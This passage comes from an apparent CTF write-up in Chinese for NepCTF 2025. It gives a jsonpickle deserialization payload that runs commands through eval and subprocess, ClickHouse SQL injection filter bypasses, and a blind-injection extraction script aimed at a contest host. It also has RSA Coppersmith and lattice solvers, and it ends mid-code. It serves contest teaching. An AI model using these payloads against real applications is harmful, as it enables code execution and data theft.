<p>由此，可以通过<code>builtin</code>或者<code>exceptions</code>来绕过<code>builtins</code>的限制。</p>
<p>黑名单中我没有限制<code>eval</code>或者<code>exec</code>，所以可以构造<code>exceptions.eval</code>或者<code>exceptions.exec</code>等相关语句来进行RCE，后面常见的字符串绕过就多种多样了。这里给出一个Payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;py/object&quot;: &quot;__main__.Session&quot;, &quot;meta&quot;: &#123;&quot;user&quot;: &#123;&quot;py/object&quot;:&quot;exceptions.eval&quot;,&quot;py/newargsex&quot;:[&#123;&quot;py/set&quot;:[&quot;exec(\&quot;imp\&quot;+\&quot;ort subpro\&quot;+\&quot;cess;subpro\&quot;+\&quot;cessgeto\&quot;+\&quot;utput(&#x27;/r\&quot;+\&quot;eadflag&gt;/app/static/flag&#x27;)\&quot;)&quot;]&#125;,&quot;&quot;]&#125; , &quot;ts&quot;: 114514&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>当然，本题也有一些非预期解法，例如调用<code>main.FORBIDDEN.pop</code>或者<code>main.FORBIDDEN.clear</code>直接将黑名单清除，也有师傅找到了其他的命令执行或者代码执行的函数进行绕过，如<code>distutils.spawn.spawn</code>、<code>profile.run</code>。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/19007988" >https://www.cnblogs.com/LAMENTXU/articles/19007988 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="我难道不是sql注入天才吗"><a href="#我难道不是sql注入天才吗" class="headerlink" title="我难道不是sql注入天才吗"></a><strong>我难道不是sql注入天才吗</strong></h2><p>题目是参加《阿里云入侵检测挑战赛-clickhouse赛道》时想到的payload（mysql绕不动了，绕过了也是内部已知），clickhouse数据库高版本支持一些特殊的sql语句写法如下：</p>
<p><strong>绕过select from</strong></p>
<p>select from语句可以写为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM table select *</span><br></pre></td></tr></table></figure></div>

<p>官方文档如下 《FROM 子句》：</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://clickhouse.com/docs/sql-reference/statements/select/from" >https://clickhouse.com/docs/sql-reference/statements/select/from <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>绕过括号限制</strong></p>
<p>一般认为没有括号就无法进行子查询，所以这里的思路只能是利用union、intersect、except中的一个进行查询拼接（mysql 8高版本也支持）</p>
<p>详细查看官方文档《SELECT Query》：</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://clickhouse.com/docs/sql-reference/statements/select" >https://clickhouse.com/docs/sql-reference/statements/select <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>阶段总结</strong></p>
<p>利用上面的payload就可以写出如下的payload来进行查询（intersect用法以及clickhouse的数据信息库不一一阐述了，自行查询）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 </span><br><span class="line">intersect </span><br><span class="line">from system.databases select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where name&gt;&#x27;abc&#x27;</span><br></pre></td></tr></table></figure></div>

<p>当数据库名大于字符串abc，就会返回User_1的信息，不大于就会报错，利用这一点可以注入出库名了，那么表名，列名呢？</p>
<p>我们注入表名列名需要使用如下语句</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 </span><br><span class="line">intersect </span><br><span class="line">from system.tables select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where database=&#x27;nepnep&#x27; and name &gt; &#x27;abc&#x27; </span><br></pre></td></tr></table></figure></div>

<p>因为没有and所以得想办法绕过</p>
<p><strong>绕过or和and</strong></p>
<p>clickhouse无法像mysql那样随意使用<code>+-*/^|</code>进行数字或者运算</p>
<p>比如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * fromtablewhereid=1=&#x27;abc&#x27;#会报错</span><br><span class="line">select * fromtablewhereid=1^name=&#x27;abc&#x27;#会报错</span><br><span class="line">select * fromtablewhereid=1andname=&#x27;abc&#x27;#正确</span><br></pre></td></tr></table></figure></div>

<p>我找到一种方法（不排除有其他方法</p>
<p>利用文档里的操作符：<a class="link"   target="_blank" rel="noopener" href="https://clickhouse.com/docs/sql-reference/operators" >https://clickhouse.com/docs/sql-reference/operators <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a ? b : c</span><br></pre></td></tr></table></figure></div>

<p>最终payload如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 intersect from system.tables select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where database=&#x27;nepnep&#x27;?name&gt;&#x27;abc&#x27;:0</span><br></pre></td></tr></table></figure></div>

<p><strong>exp</strong></p>
<p>exp因为字符比较问题有一些小bug，不想修摆烂了，最后一位会差1个字符，比如nepnep变成nepneo，手动修改下，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;https://nepctf31-babr-hwkw-gp5p-922mchfng311.nepctf.com/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    left=<span class="number">1</span></span><br><span class="line">    right=<span class="number">129</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> right-left!=<span class="number">1</span>:</span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="comment">#&#x27;id&#x27;:&quot;1 intersect from system.databases select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where name&gt;&#x27;&#123;mid&#125;&#x27; limit 1,1&quot;.format(mid=flag+chr(mid))</span></span><br><span class="line">        <span class="comment">#nepnep</span></span><br><span class="line">        <span class="comment">#&#x27;id&#x27;:&quot;1 intersect from system.tables select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where database=&#x27;nepnep&#x27;?name&gt;&#x27;&#123;mid&#125;&#x27;:0&quot;.format(mid=flag+chr(mid))</span></span><br><span class="line">        <span class="comment">#nepnep</span></span><br><span class="line">        <span class="comment">#&#x27;id&#x27;:&quot;1 intersect from system.columns select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where table=&#x27;nepnep&#x27;?name&gt;&#x27;&#123;mid&#125;&#x27;:0 limit 2,1&quot;.format(mid=flag+chr(mid))</span></span><br><span class="line">        <span class="comment">#51@g_ls_h3r3</span></span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 intersect from nepnep.nepnep select 1,&#x27;User_1&#x27;,&#x27;user1@example.com&#x27;,44 where `51@g_ls_h3r3`&gt;&#x27;&#123;mid&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(mid=flag+<span class="built_in">chr</span>(mid))</span><br><span class="line">        <span class="comment">#NepCTF&#123;9dd5d582-d102-1e6b-75ff-154291064870&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span><span class="string">&#x27;未找到ID&#x27;</span>notin r.text:</span><br><span class="line">            left=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">    flag+=<span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(flag.encode())</span><br></pre></td></tr></table></figure></div>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h2 id="ezRSA2"><a href="#ezRSA2" class="headerlink" title="ezRSA2"></a><strong>ezRSA2</strong></h2><p>符号约定：</p>
<p>设为相关小奇素数的乘积。根据CRT，可由求得 .</p>
<p>记, .</p>
<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a><strong>方法1</strong></h4><p>根据RSA等式有</p>
<p>考虑到题目中，与无额外信息的小攻击（最佳渐进界为）界相差不大。且题目描述中提示了，不需要使用复杂的Coppersmith策略（界是富裕的），并且比NepCTF 2024的ezRSA更简单。</p>
<p>使用简单shift多项式策略的二元coppersmith方法，直接求解式 即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import sieve_base, long_to_bytes</span><br><span class="line">import itertools</span><br><span class="line">from sage.all import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">beta = 0.33</span><br><span class="line"></span><br><span class="line">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span><br><span class="line">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span><br><span class="line"></span><br><span class="line">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span><br><span class="line"></span><br><span class="line">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span><br><span class="line"></span><br><span class="line"># defund small_roots</span><br><span class="line"># https://github.com/defund/coppersmith</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):</span><br><span class="line">    ifnot d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    if isinstance(f, Polynomial):</span><br><span class="line">        x, = polygens(f.base_ring(), f.variable_name(), 1)</span><br><span class="line">        f = f(x)</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    </span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m+1):</span><br><span class="line">        base = N**(m-i) * f**i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    st1 = time.time()</span><br><span class="line">    </span><br><span class="line">    B = (B.dense_matrix()).LLL(epsilon=0.99)</span><br><span class="line">    # B = flatter(B)</span><br><span class="line">    </span><br><span class="line">    end = time.time()</span><br><span class="line">    print(f&#x27;time of lattice reduction: &#123;end-st1&#125;s&#x27;)</span><br><span class="line">    print(f&#x27;&#123;B.dimensions() = &#125;&#x27;)</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1/factor)</span><br><span class="line"></span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B*monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line"></span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line">li_list = list(sieve_base[1:len(hints)+1])</span><br><span class="line"></span><br><span class="line">def attack():</span><br><span class="line">    M = prod(li_list)</span><br><span class="line">    print(f&#x27;&#123;M.bit_length() = &#125;&#x27;)</span><br><span class="line">    dM = CRT(hints, li_list)</span><br><span class="line">    # ed-1 = k(N+1-(p+q))</span><br><span class="line">    # k(N+1)-k(p+q)-(e*dM-1) = 0(eM)</span><br><span class="line">    print(f&#x27;&#123;dM = &#125;&#x27;)</span><br><span class="line">    print(f&#x27;&#123;dM.bit_length() = &#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    PR = PolynomialRing(Zmod(e*M), &#x27;x,y&#x27;)</span><br><span class="line">    x,y = PR.gens()</span><br><span class="line"></span><br><span class="line">    f = x*(N+1)-x*y-(e*dM-1)</span><br><span class="line"></span><br><span class="line">    XX = (e*2**ceil(2048*beta)) // N</span><br><span class="line">    YY = 3*2**1024</span><br><span class="line"></span><br><span class="line">    roots = list(small_roots(f, [XX,YY], m=1))</span><br><span class="line">    print(roots)</span><br><span class="line">    assert len(roots) == 1</span><br><span class="line"></span><br><span class="line">    k, r = roots[0]</span><br><span class="line">    # ed-1=k(N+1-r)</span><br><span class="line">    k, r = ZZ(k), ZZ(r)</span><br><span class="line">    d = (k*(N+1-r) + 1) // e</span><br><span class="line">    </span><br><span class="line">    print(f&#x27;&#123;d=&#125;&#x27;)</span><br><span class="line">    print(f&#x27;&#123;d.bit_length() = &#125;&#x27;)</span><br><span class="line">    assert e*d-1==k*(N+1-r)</span><br><span class="line"></span><br><span class="line">    pt = pow(ct, d, N)</span><br><span class="line">    print(long_to_bytes(pt))</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    attack()</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>

<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a><strong>方法2</strong></h4><p>由于界比较富裕，可以根据Wiener攻击对应的二维格构造思路进行攻击。</p>
<p>取其中小量为 ，将其表为已知量的线性组合</p>
<p>构造格如下</p>
<p>格的行列式为 ，想要让。</p>
<p><strong>最佳做法是令****的分量绝对值量级一致</strong>，因此选择如下参数配平</p>
<p>此时有, ，大致满足攻击条件。</p>
<p>使用LLL解出，根据第三个分量算出，再计算即可解密。</p>
<p>一些评注：</p>
<ol>
<li>三维格的多种构造方法（例如X1放到最后一行第3个），但它们的界相同。第一行不放，的分量中就不涉及。不过也可以根据LLL算法的行变换矩阵算出，或解出后再用式 算 </li>
<li>二维格的界不够，最佳配平下</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import Matrix, prod, CRT, ZZ</span><br><span class="line">from Crypto.Util.number import sieve_base, long_to_bytes</span><br><span class="line"></span><br><span class="line"># 攻击算法大框架与关键注释来自于SeanDictionary的wp，此处做了一些修改</span><br><span class="line"># https://seandictionary.top/nepctf-2025/</span><br><span class="line"></span><br><span class="line">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span><br><span class="line">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span><br><span class="line"></span><br><span class="line">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span><br><span class="line"></span><br><span class="line">hints = [1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span><br><span class="line">d0 = CRT(hints, list(sieve_base)[1:len(hints)+1])</span><br><span class="line">M = prod(list(sieve_base)[1:len(hints)+1])</span><br><span class="line"></span><br><span class="line"># 675 = int(2048*beta)</span><br><span class="line"># 338 ~ 1024*gamma</span><br><span class="line">X1 = 2**(1024+675-338)</span><br><span class="line">X2 = 2**(1025+675)</span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ, 3, 3)</span><br><span class="line">L[0, 0] = e*M</span><br><span class="line">L[0, 2] = X1</span><br><span class="line">L[1, 0] = e*d0</span><br><span class="line">L[1, 1] = X2</span><br><span class="line">L[2, 0] = N+1</span><br><span class="line"></span><br><span class="line">L = L.LLL()</span><br><span class="line">print(f&#x27;After LLL, L=\n&#123;L&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">for row in L:</span><br><span class="line">    d = d0 + row[2]//X1*M</span><br><span class="line">    print(int(d).bit_length(), row[1]==X2)</span><br><span class="line">    # 这里关注d的位数要等于675</span><br><span class="line">    # 然后最短向量的中间一位应该为K2</span><br><span class="line">    # 按照这两个约束进行调参</span><br><span class="line">    if int(d).bit_length() == int(2048*0.33):</span><br><span class="line">        m = pow(ct, d, N)</span><br><span class="line">        print(long_to_bytes(int(m)))</span><br></pre></td></tr></table></figure></div>

<h4 id="后记-致谢"><a href="#后记-致谢" class="headerlink" title="后记 &amp; 致谢"></a><strong>后记 &amp; 致谢</strong></h4><p>审wp时看到方法2的解法感觉比较惊喜，有2位选手用了类似的方法。方法2的代码是基于SeanDictionary的wp修改的。我们对三维格构造的思想与细节做了补充，希望对大家有益。</p>
<p>此外方法1在Coppersmith策略上有可用优化，但较为复杂。见Partial Key Exposure Attacks on RSA: Achieving the Boneh-Durfee Bound的第5节。</p>
<p>顺带一提，ezRSA2的续作很可能会在NepCTF 2026出现。可能涉及前作所用的技术，但难度会更高。敬请期待！</p>
<h2 id="Lattice-Bros"><a href="#Lattice-Bros" class="headerlink" title="Lattice Bros"></a><strong>Lattice Bros</strong></h2><p>格密码的基础入门题，可以参考<a class="link"   target="_blank" rel="noopener" href="https://eprint.iacr.org/2023/032%E4%B8%AD%E7%9A%843.6%E4%B8%8E4.3" >https://eprint.iacr.org/2023/032中的3.6与4.3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在step1中，求解a0需要还原极小多项式f，可以参考3.6中的方法，构造格求出一个短向量，短向量中包含各个系数。得到a0才能还原p，进而进行step2。</p>
<p>step2是一个经典的HNP问题。求alpha的算法不止babai算法一种，本质是一个CVP问题，也可以参考4.3中的方法，通过坐标变换 转换成SVP问题求解。</p>
<p>Exp:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">#step1 求a0</span><br><span class="line">beta = 54236.606188881754809671280151541781895183337725393</span><br><span class="line"></span><br><span class="line"># 构造基矩阵</span><br><span class="line">M = matrix(ZZ, [[10**50, 1, 0, 0], [10**50 * beta, 0, 1, 0],</span><br><span class="line">                [10**50 * beta ^ 2, 0, 0, 1], [10**50 * beta ^ 3, 0, 0, 0]])</span><br><span class="line"></span><br><span class="line">M_reduced = M.LLL()</span><br><span class="line">a0, a1, a2 = M_reduced[0][1], M_reduced[0][2], M_reduced[0][3]</span><br><span class="line">f = x ^ 3 + a2 * x ^ 2 + a1 * x + a0</span><br><span class="line">f</span><br><span class="line"></span><br><span class="line">#step2 babai算法求alpha</span><br><span class="line">def babai_cvp(B_reduced, t):</span><br><span class="line">    G = B_reduced.gram_schmidt()[0]  </span><br><span class="line">    t_proj = t</span><br><span class="line">    v = 0</span><br><span class="line">    for i in reversed(range(B_reduced.nrows())):</span><br><span class="line">        c = (t_proj * G[i]) / (G[i] * G[i])</span><br><span class="line">        c = round(c)</span><br><span class="line">        v += c * B_reduced[i]</span><br><span class="line">        t_proj -= c * B_reduced[i]</span><br><span class="line">    return v</span><br><span class="line"></span><br><span class="line">d = 981020902672546902438782010902608140583199504862558032616415</span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">f = open(r&quot;samples.txt&quot;)</span><br><span class="line">samples = f.readlines()</span><br><span class="line">samples = eval(samples[0])</span><br><span class="line"></span><br><span class="line">m = 30</span><br><span class="line"></span><br><span class="line"># 构造格基矩阵 B（m+1 维）</span><br><span class="line">B_matrix = [[0for _ in range(m + 1)] for _ in range(m + 1)]</span><br><span class="line">for i in range(m):</span><br><span class="line">    B_matrix[i][i] = p</span><br><span class="line">for j in range(m):</span><br><span class="line">    B_matrix[m][j] = samples[j][0]</span><br><span 